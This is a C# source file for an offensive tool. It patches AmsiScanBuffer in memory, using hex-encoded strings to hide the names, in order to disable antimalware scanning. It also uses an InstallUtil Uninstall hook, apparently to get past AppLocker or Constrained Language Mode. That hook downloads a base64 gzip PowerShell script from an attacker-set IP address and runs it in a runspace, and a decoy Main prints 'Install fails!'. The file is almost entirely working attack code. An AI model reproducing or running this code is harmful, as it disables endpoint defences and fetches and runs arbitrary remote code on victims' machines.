using System;
using System.IO;
using System.IO.Compression;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Net;

namespace Bypass
{
    class Program
    {

        static void Main(string[] args)
        {
            Console.WriteLine("Install fails!");
        }

    }

    public class BypassCLM
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static string FromHexBuffer(String hexdata)
        {
            string buffer = "";
            String[] hexbuffersplit = hexdata.Split(';');
            foreach (String hex in hexbuffersplit)
            {
                int value = Convert.ToInt32(hex, 16);
                buffer += Char.ConvertFromUtf32(value);
            }

            return buffer;
        }
       
        
        public static int Bypass()
        {

            //borrowed from /https[:]//iwantmore.pizza/posts/amsi.html
            string hexbuffer = "41;6d;73;69;53;63;61;6e;42;75;66;66;65;72";
            string hexdllbuffer = "61;6d;73;69;2e;64;6c;6c";

            string buf1 = FromHexBuffer(hexdllbuffer);
            string buf2 = FromHexBuffer(hexbuffer);
            IntPtr Address = GetProcAddress(LoadLibrary(buf1), buf2);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            byte c1 = 0xB8, c2 = 0x80;

            Byte[] Patch = { c1, 0x57, 0x00, 0x07, c2, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            Console.WriteLine("Reached here!");
            return 0;

        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {


        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //add your IP Address here!
            string url = "http://192.168.44.100:8080/base64encodedGzip.txt";
            string inputFilePath = "";
            bool isDownloadSuccessful = false;

            try
            {
                using (WebClient client = new WebClient())
                {
                    string downloadedContents = client.DownloadString(url);
                    isDownloadSuccessful = true;
                    inputFilePath = downloadedContents;
                }
                Console.WriteLine("[+] Download successful!");
                //Console.WriteLine(inputFilePath);
            }
            catch (Exception e)
            {
                Console.WriteLine("[+] Error downloading file: " + e.Message);
                Environment.Exit(1);
            }

            if (!isDownloadSuccessful)
            {
                Console.WriteLine("[+] Download failed!");
                Environment.Exit(1);
            }

            else
            {
                Console.WriteLine("At the stage of bypass!");
                //Console.WriteLine(BypassCLM.Bypass());


                //string encodedScript = File.ReadAllText(inputFilePath);

                byte[] compressedBytes = Convert.FromBase64String(inputFilePath);
                // Decompress the byte array using gzip decompression
                byte[] scriptBytes;
                using (var memoryStream = new MemoryStream(compressedBytes))
                {
                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                    {
                        using (var outputMemoryStream = new MemoryStream())
                        {
                            gzipStream.CopyTo(outputMemoryStream);
                            scriptBytes = outputMemoryStream.ToArray();
                        }
                    }
                }

                string scriptContent = Encoding.UTF8.GetString(scriptBytes);

                using (var runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();
                    using (var pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(scriptContent);
                        pipeline.Commands.Add("Out-String");
           
                        var output = pipeline.Invoke();
                        scriptContent = "";
                        var outputString = new StringBuilder();
                        foreach (var item in output)
                        {
                            outputString.AppendLine(item.ToString());
                        }
                        Console.WriteLine(outputString.ToString());

                        //debug output
                        //File.WriteAllText("result.txt", outputString.ToString());
                    }

                    runspace.Dispose();
                }

            }

        }


    }

}


